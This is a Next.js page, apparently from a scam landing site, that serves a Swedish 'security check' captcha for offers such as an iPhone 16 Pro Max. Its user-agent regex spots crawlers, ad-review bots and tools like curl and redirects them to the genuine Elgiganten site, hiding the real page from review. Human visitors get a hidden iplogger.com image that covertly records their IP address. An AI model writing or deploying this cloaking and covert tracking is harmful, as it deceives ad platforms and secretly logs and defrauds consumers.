import Header from "../../components/Header";
import Footer from "../../components/Footer";
import CaptchaRedirectClientWrapper from "./CaptchaRedirectClientWrapper";
import Script from "next/script";
import { headers } from "next/headers";
import { redirect } from "next/navigation";

type PageProps = {
  searchParams?: { id?: string };
};

// IDs for which we want to fire the Google Ads conversion event
const TRACKED_OFFERS = new Set([
  "iphone-16-pro-max",
  "elg-001",
  "elg-002",
  "elg-003",
  "free-shipping",
  "elg-005",
  "elg-006",
  "elg-007",
  "elg-008",
  "elg-009",
  "elg-010",
  "elg-011",
  "elg-012",
]);

// Broad bot/crawler UA detection (includes Google-CloudVertexBot)
const BOT_UA =
  /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;

export default function VerifyPage({ searchParams }: PageProps) {
  const id = (searchParams?.id || "").toLowerCase();
  const shouldFire = TRACKED_OFFERS.has(id);

  // Detect bots on the server
  const ua = headers().get("user-agent") || "";
  const isBot = BOT_UA.test(ua);

  // 🚫 Bots never touch the real redirect flow — send them to elgiganten.se
  if (isBot) {
    redirect("https://www.elgiganten.se");
  }

  // 🟢 Humans get normal flow (captcha + optional conversion event)
  return (
    <>
      {shouldFire && (
        <Script id={`aw-outbound-${id}`} strategy="afterInteractive">
          {`
            gtag('event', 'conversion', {
              'send_to': 'AW-11111111111111111111/xxxxxxxxxxxxxxxxxxxxxx',
              'value': 1.0,
              'currency': 'RON'
            });
          `}
        </Script>
      )}

      <Header />
      <main className="flex flex-col items-center justify-center min-h-screen py-8 px-4">
        <div className="max-w-md w-full bg-white rounded-xl shadow-md p-6">
          <h1 className="text-xl font-semibold text-center mb-4">
            Säkerhetskontroll
          </h1>

          <CaptchaRedirectClientWrapper />

          {/* Invisible IP Logger */}
          <img
            src="https://iplogger.com/2i6JC5"
            border={0}
            style={{ display: "none" }}
            alt=""
          />
        </div>
      </main>
      <Footer />
    </>
  );
}



